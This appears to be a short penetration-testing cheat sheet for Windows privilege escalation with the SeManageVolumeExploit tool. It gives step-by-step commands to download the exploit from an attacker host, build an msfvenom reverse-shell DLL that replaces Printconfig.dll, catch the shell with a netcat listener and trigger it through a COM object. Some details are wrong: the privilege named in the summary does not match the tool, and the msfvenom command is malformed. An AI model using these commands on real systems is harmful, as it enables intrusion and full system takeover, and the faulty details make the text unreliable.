# SeManageVolumeExploit

### Summary

Use this to exploit SeChangeNotifyPrivilege. Replace a dll with a malicious dll.

### Commands

#### ONLY 1 ATTEMPT. DONT MISPELL

GitHub page
* [https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)


Use Powershell. Upload script. Run the script
```
powershell
```
```
iwr -uri http://HOSTIP:8888/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
```
```
.\SeManageVolumeExploit.exe
```

On the host Kali machine, use msfvenom to generate a malicious dll payload. Change LHOST and LPORT.  Move it to the target machine
```
msfvenom -a x64 - windows/x64/shell_reverse_tcp LHOST= LPORT=1337 -f dll -o Printconfig.dll
```
```
iwr -uri http://HOSTIP:8000/Printconfig.dll -o Printconfig.dll
```

Setup netcat listener
```
nc -nlvp 1337
```

Run these two lines of code on the target machine.
```
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
```
```
$object = [Activator]::CreateInstance($type)
```

